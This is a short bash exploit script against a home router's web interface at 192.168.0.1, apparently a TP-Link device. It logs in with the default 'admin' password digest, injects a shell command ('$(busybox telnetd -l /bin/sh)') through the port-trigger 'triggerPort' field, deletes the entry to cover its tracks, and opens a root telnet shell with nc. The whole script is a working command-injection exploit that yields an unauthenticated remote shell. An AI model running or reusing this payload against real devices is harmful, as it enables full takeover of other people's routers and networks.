#!/usr/bin/env bash

nonce=$(curl -s 'http://192.168.0.1/cgi-bin/auth_cgi' -X POST  -d '{"module":"authenticator","action":0}' | jq -r .nonce)
md5=$(printf "%s:%s" admin "$nonce" | md5sum | cut "-d " -f1)
printf "Nonce: %s\nMD5: %s\n" "$nonce" "$md5"

token=$(curl -s 'http://192.168.0.1/cgi-bin/auth_cgi' -d '{"module":"authenticator","action":1,"digest":"'"$md5"'"}' | jq -r .token)

if [[ -z "$token" ]]; then
	echo "No Token!"
	exit 1
fi
printf "Token: %s\n" "$token"

curl -s 'http://192.168.0.1/cgi-bin/web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"portTrigger","action":1,"entryId":1,"enableState":1,"applicationName":"telnetd","triggerPort":"$(busybox telnetd -l /bin/sh)","triggerProtocol":"TCP","openPort":"1337-2137","openProtocol":"TCP"}' > /dev/null
curl -s 'http://192.168.0.1/cgi-bin/web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"portTrigger","action":2,"entryIdSet":[1]}' > /dev/null

echo Done.

(stty -icanon -echo; nc -O1 192.168.0.1 23)
stty icanon echo
